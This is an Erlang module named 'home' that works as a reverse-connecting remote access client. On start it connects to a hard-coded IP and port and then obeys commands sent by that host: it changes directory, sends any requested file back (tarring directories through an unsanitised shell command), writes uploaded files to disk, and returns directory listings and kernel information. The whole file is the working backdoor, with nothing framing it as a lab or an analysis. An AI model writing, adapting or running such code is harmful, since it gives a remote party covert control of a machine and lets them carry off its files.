-module(home).
-export([start/0,start_link/0]).
%27517
start_link() ->
    file:make_dir("default"),
    shell_default:cd("default"),
    spawn(?MODULE,start,[]),{ok,self()}.
start() ->
    Socket = case gen_tcp:connect({172,19,4,57}, 27517, [binary, {active,false}]) of
                {ok, Sock} -> Sock;
                _ -> throw({error,samdnraky})
            end,
    case file:read_file("dump.txt") of
        {ok, BinaryFile} ->
            case BinaryFile of
                <<>> ->
                    gen_tcp:send(Socket,<<"hello">> ),
                    case gen_tcp:recv(Socket,0) of
                        {ok, Packet} ->
                            case Packet of
                                <<"youkey ",Pack/binary>> ->
                                    io:format("~p~n",[Packet]),
                                    file:write_file("dump.txt", Pack),
                                    loop(Socket);
                                _ ->
                                    start()
                            end;
                        {error, Reason} ->
                            io:format("error:~p~n",[Reason])
                    end;
                _ ->
                    %io:format("send ~p file~n",[BinaryFile]),
                    gen_tcp:send(Socket, BinaryFile),
                    case gen_tcp:recv(Socket,0) of
                        {ok, Packet} ->
                            case Packet of
                                <<"clear ",Pack/binary>> ->
                                    io:format("~p~n",[Packet]),
                                    file:write_file("dump.txt", Pack),
                                    loop(Socket);
                                _ ->
                                    loop(Socket)
                            end;
                        {error, Reason} ->
                            io:format("error:~p~n",[Reason])
                    end
            end;
        _ ->
            {ok, File} = file:open("dump.txt", write),
            file:close(File),
            gen_tcp:close(Socket),
            start()
    end.

loop(Socket) ->
    case gen_tcp:recv(Socket,0) of
        {ok, Packet} ->
            case Packet of
                <<"cd ",Pack/binary>> ->
                    shell_default:cd(binary_to_list(Pack)),
                    loop(Socket);
                <<"getf ",Pack/binary>> ->
                    case file:read_file(binary_to_list(Pack)) of
                        {ok, BinaryFile} ->
                            %io:format("send ~p~n file",[BinaryFile]),
                            case filelib:is_file(binary_to_list(Pack)) of
                                true ->
                                    gen_tcp:send(Socket, BinaryFile),
                                    loop(Socket);
                                false ->
                                    os:cmd("tar -cvzf " ++ binary_to_list(Pack) ++ ".tar.gz " ++ binary_to_list(Pack)),
                                    {ok, BFile} = file:read_file(binary_to_list(Pack) ++ ".tar.gz"),
                                    gen_tcp:send(Socket, BFile),
                                    loop(Socket)
                            end;
                        {error, Reason} ->
                            io:format("error:~p~n",[Reason]),
                            loop(Socket)
                    end;
                <<"sendf ",Pack/binary>> ->
                    {ok, Size} = gen_tcp:recv(Socket,0),
                    %io:format("~p~n~p~n",[Pack,Size]),
                    case gen_tcp:recv(Socket,binary_to_integer(Size)) of
                        {ok, BinaryFile} ->
                            %io:format("~p~n",[BinaryFile]),
                            file:write_file(binary_to_list(Pack), BinaryFile),
                            loop(Socket);
                        {error, Reason} ->
                            io:format("error:~p~n",[Reason]),
                            loop(Socket)
                    end;
                <<"list">> ->
                    ListFile = erlang:list_to_binary(os:cmd("ls")),
                    gen_tcp:send(Socket, ListFile),
                    loop(Socket);
                <<"kernalinfo">> ->
                    Kernal = os:cmd("uname -a"),
                    gen_tcp:send(Socket, Kernal),
                    loop(Socket);
                _ ->
                    io:format("errorCmd:~p~n",[Packet]),
                    loop(Socket)
            end;
        {error, Reason} ->
            io:format("error:~p~n",[Reason]),
            loop(Socket)
    end.
